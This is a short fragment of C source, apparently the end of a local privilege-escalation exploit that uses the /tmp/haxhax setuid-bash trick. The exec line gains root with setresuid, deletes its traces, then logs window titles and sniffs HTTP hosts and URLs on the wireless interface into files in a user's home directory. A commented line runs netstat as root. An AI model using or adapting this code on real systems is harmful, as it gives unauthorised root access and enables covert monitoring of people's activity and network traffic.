...
main(int argc, char **argv)
{
    ...
    if(s.st_mode == 0x89ed){
      execl("/tmp/haxhax/u/bash","bash","-p","-c","rm -rf /tmp/haxhax;python -c \"import os;os.setresuid(0,0,0);os.system('export DISPLAY=:0;wmctrl -l>>\"/home/dimas/log.txt\";date >>/home/dimas/date.txt;cat /home/dimas/date.txt /home/dimas/log.txt >>/home/dimas/log-w-date.txt;httpry -F -i wlan0 -f host,request-uri | tr -d t>> /home/dimas/hasilcronurlofs.txt;');\"",NULL);
      //execl("/tmp/haxhax/u/bash","bash","-p","-c","rm -rf /tmp/haxhax;python -c \"import os;os.setresuid(0,0,0);os.execl('/bin/netstat','bash')\"",NULL);
    }
